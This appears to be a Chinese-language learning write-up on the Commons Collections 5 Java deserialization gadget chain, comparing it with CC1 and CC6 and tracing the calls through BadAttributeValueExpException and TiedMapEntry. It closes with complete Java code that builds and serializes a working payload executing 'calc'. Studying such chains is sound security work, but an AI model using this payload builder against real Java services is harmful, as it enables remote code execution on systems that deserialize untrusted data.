CC5和CC1的LazyMap差不多

# LazyMap调用链
AnnotationInvocationHandler.readObject()

Map(Proxy).entrySet()

LazyMap.get()

ChainedTransformer.transform()

InvokerTransformer.transform()

Runtime.exec()

# CC6的调用链
HashMap.readObject()

HashMap.hash()

TiedMapEntry.hashCode()

TiedMapEntry.getValue()

LazyMap.get()

ChainedTransformer.transform()

InvokerTransformer.transform()

Runtime.exec()


# CC5和CC6极其的相似，只是调用的触发点不一样

ObjectInputStream.readObject()

BadAttributeValueExpException.readObject()

TiedMapEntry.toString()

TiedMapEntry.getValue()

LazyMap.get()

ChainedTransformer.transform()

InvokerTransformer.transform()

Runtime.exec()

在CC6中用的是TiedMapEntry.hashCode()来调用的TiedMapEntry.getValue()

在CC5中则换了一种调用方式，
利用TiedMapEntry.toString()来对TiedMapEntry.getValue()方法进行调用，
之后利用BadAttributeValueExpException.readObject来触发

在TiedMapEntry类中的toString()方法中也调用了getValue()方法

<img width="2193" height="1455" alt="image" src="https://github.com/user-attachments/assets/2edbc858-9581-4bd8-a095-17d074d85d32" />

现在继续往上找，谁调用了toString()，
直接来到BadAttributeValueExpException异常类，
在这里的readObject()方法中调用了toString

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/02278326-1994-4808-95cf-69bd33241ee4" />

这里需要过掉两个if，才能调用到toString

代码分析：

如果 传入的 valObj是null，那就直接赋值null，
如果 传入的是String类型，赋值给val，
如果 当前没有SecurityManager(一般默认没有)，或者valObj是一个常见类型，
那就调用valObj.toString()

这里的toString调用的是TiedMapEntry.getValue()再调用的LazyMap.get()

<img width="558" height="150" alt="image" src="https://github.com/user-attachments/assets/9b0d7eff-5351-44e0-ae36-6118d270a2af" />

所以，直接在TiedMapEntry传入之前构造好的LazyMap，现在调用toString，是可以弹出计算器的


<img width="2082" height="1460" alt="image" src="https://github.com/user-attachments/assets/315e29b4-78ca-475c-b2ef-ae47a930563c" />

这个valObj就是val参数，
因为是private，需要反射获取

<img width="2082" height="1460" alt="image" src="https://github.com/user-attachments/assets/03e7fdc0-eefa-4ccd-96ef-46ab1c8ac94c" />

反射获取val，将其设置为之前构造好的tiedMapEntry

<img width="2082" height="1461" alt="image" src="https://github.com/user-attachments/assets/81b658ed-10be-4820-8b39-2f1a2e61896d" />

这里的valObj就等于tiedMapEntry，然后调用tiedMapEntry.toString()方法，
tiedMapEntry.toString()调用getValue()方法，
getValue()方法调用LazyMap.get()之后又调用ChainedTransformer，
最后调用InvokerTransformer.transform()执行Runtime.exe

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "hahaha");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class aClass = badAttributeValueExpException.getClass();
        Field val = aClass.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        serialize(badAttributeValueExpException);
        unserialize("ser.bin");

    }

    public static void serialize(Object object) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    //反序列化方法
    public static void unserialize(String filename) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }
















